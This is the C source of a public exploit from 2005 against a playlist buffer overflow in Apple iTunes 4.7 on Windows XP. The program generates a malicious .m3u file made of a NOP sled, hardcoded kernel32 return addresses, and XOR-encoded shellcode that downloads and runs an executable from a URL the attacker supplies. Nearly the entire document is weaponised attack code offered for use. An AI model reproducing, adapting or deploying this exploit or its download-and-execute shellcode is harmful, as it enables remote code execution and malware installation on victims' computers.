/*
*
* Apple iTunes Playlist Buffer Overflow Download Shellcoded Exploit
* Bug discoveried by iDEFENSE Security  (http://www.idefense.com)
* Exploit coded By ATmaCA
* Copyright �2002-2005 AtmacaSoft Inc. All Rights Reserved.
* Web: http://www.atmacasoft.com
* E-Mail: atmaca@icqmail.com
* Credit to xT and delikon
* Usage:exploit <Target> <OutputPath> <Url>
* Targets:
* 1 - WinXP SP1 english - kernel32.dll push eax - ret [0x77E6532A]
* 2 - WinXP SP2 english - kernel32.dll push eax - ret [0x7C80BCB0]
* Example:exploit 1 vuln.m3u http://www.atmacasoft.com/exp/msg.exe
*
*/

/*
*
* Up to iTunes version 4.7 are affected
* Tested with iTunes v4.7 on WinXp Sp2 english platform
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>


#ifdef __BORLANDC__
        #include <mem.h>
#endif

#define NOP 0x90

/* (*.m3u) playlist header */
char m3u_playlist_header[] = "http://";

/* Generic win32 http download shellcode
   xored with 0x1d by delikon (http://delikon.de/) */
char shellcode[] = "\xEB"
"\x10\x58\x31\xC9\x66\x81\xE9\x22\xFF\x80\x30\x1D\x40\xE2\xFA\xEB\x05\xE8\xEB\xFF"
"\xFF\xFF\xF4\xD1\x1D\x1D\x1D\x42\xF5\x4B\x1D\x1D\x1D\x94\xDE\x4D\x75\x93\x53\x13"
"\xF1\xF5\x7D\x1D\x1D\x1D\x2C\xD4\x7B\xA4\x72\x73\x4C\x75\x68\x6F\x71\x70\x49\xE2"
"\xCD\x4D\x75\x2B\x07\x32\x6D\xF5\x5B\x1D\x1D\x1D\x2C\xD4\x4C\x4C\x90\x2A\x4B\x90"
"\x6A\x15\x4B\x4C\xE2\xCD\x4E\x75\x85\xE3\x97\x13\xF5\x30\x1D\x1D\x1D\x4C\x4A\xE2"
"\xCD\x2C\xD4\x54\xFF\xE3\x4E\x75\x63\xC5\xFF\x6E\xF5\x04\x1D\x1D\x1D\xE2\xCD\x48"
"\x4B\x79\xBC\x2D\x1D\x1D\x1D\x96\x5D\x11\x96\x6D\x01\xB0\x96\x75\x15\x94\xF5\x43"
"\x40\xDE\x4E\x48\x4B\x4A\x96\x71\x39\x05\x96\x58\x21\x96\x49\x18\x65\x1C\xF7\x96"
"\x57\x05\x96\x47\x3D\x1C\xF6\xFE\x28\x54\x96\x29\x96\x1C\xF3\x2C\xE2\xE1\x2C\xDD"
"\xB1\x25\xFD\x69\x1A\xDC\xD2\x10\x1C\xDA\xF6\xEF\x26\x61\x39\x09\x68\xFC\x96\x47"
"\x39\x1C\xF6\x7B\x96\x11\x56\x96\x47\x01\x1C\xF6\x96\x19\x96\x1C\xF5\xF4\x1F\x1D"
"\x1D\x1D\x2C\xDD\x94\xF7\x42\x43\x40\x46\xDE\xF5\x32\xE2\xE2\xE2\x70\x75\x75\x33"
"\x78\x65\x78\x1D";

char *target[]=  //return addr - EIP
{
        "\x2A\x53\xE6\x77",   //push eax - kernel32.dll - WinXP Sp1 english
        "\xB0\xBC\x80\x7C"    //push eax - kernel32.dll - WinXP Sp2 english
};

FILE           *di;
int            targetnum;
int            i = 0;
short int      weblength;

char           *web;

char           *pointer = NULL;
char           *newshellcode;

/*xor cryptor*/
char *Sifrele(char *Name1)
{
        char *Name=Name1;
        char xor=0x1d;
        int Size=strlen(Name);
        for(i=0;i<Size;i++)
                Name[i]=Name[i]^xor;
        return Name;
}


void main(int argc, char *argv[])
{

        if (argc < 4)
        {
                printf("Apple iTunes Playlist Buffer Overflow Download Shellcoded Exploit\n");
                printf("Bug discoveried by iDEFENSE Security  (http://www.idefense.com)\n");
                printf("Exploit coded By ATmaCA\n");
                printf("Copyright �2002-2005 AtmacaSoft Inc. All Rights Reserved.\n");
                printf("Web: http://www.atmacasoft.com\n");
                printf("E-Mail: atmaca@icqmail.com\n");
                printf("Credit to xT and delikon\n\n");
                printf("\tUsage:exploit <Target> <OutputPath> <Url>\n");
                printf("\tTargets:\n");
                printf("\t1 - WinXP SP1 english - kernel32.dll push eax - ret [0x77E6532A]\n");
                printf("\t2 - WinXP SP2 english - kernel32.dll push eax - ret [0x7C80BCB0]\n");
                printf("\tExample:exploit 1 vuln.m3u http://www.atmacasoft.com/exp/msg.exe\n");

                return;
        }


        targetnum = atoi(argv[1]) - 1;
	web = argv[3];

        if( (di=fopen(argv[2],"wb")) == NULL )
        {
                printf("Error opening file!\n");
                return;
        }
        for(i=0;i<sizeof(m3u_playlist_header)-1;i++)
                fputc(m3u_playlist_header[i],di);

        /*stuff in a couple of NOPs*/
        for(i=0;i<3045;i++)
                fputc(NOP,di);

	/*Overwriting the return address (EIP) with push eax address*/
        /*located somewhere in process space*/
        fprintf(di,"%s",target[targetnum]); // - ret

        for(i=0;i<50;i++) //NOPs
                fputc(NOP,di);


        weblength=(short int)0xff22;
        pointer=strstr(shellcode,"\x22\xff");
	weblength-=strlen(web)+1;
        memcpy(pointer,&weblength,2);
        newshellcode = new char[sizeof(shellcode)+strlen(web)+1];
        strcpy(newshellcode,shellcode);
        strcat(newshellcode,Sifrele(web));
        strcat(newshellcode,"\x1d");


        for(i=0;i<strlen(newshellcode);i++)
                fputc(newshellcode[i],di);

        //for(i=0;i<50;i++) //NOPs
                //fputc(NOP,di);

        printf("Vulnarable m3u file %s has been generated!\n",argv[2]);

        fclose(di);
}

// milw0rm.com [2005-01-16]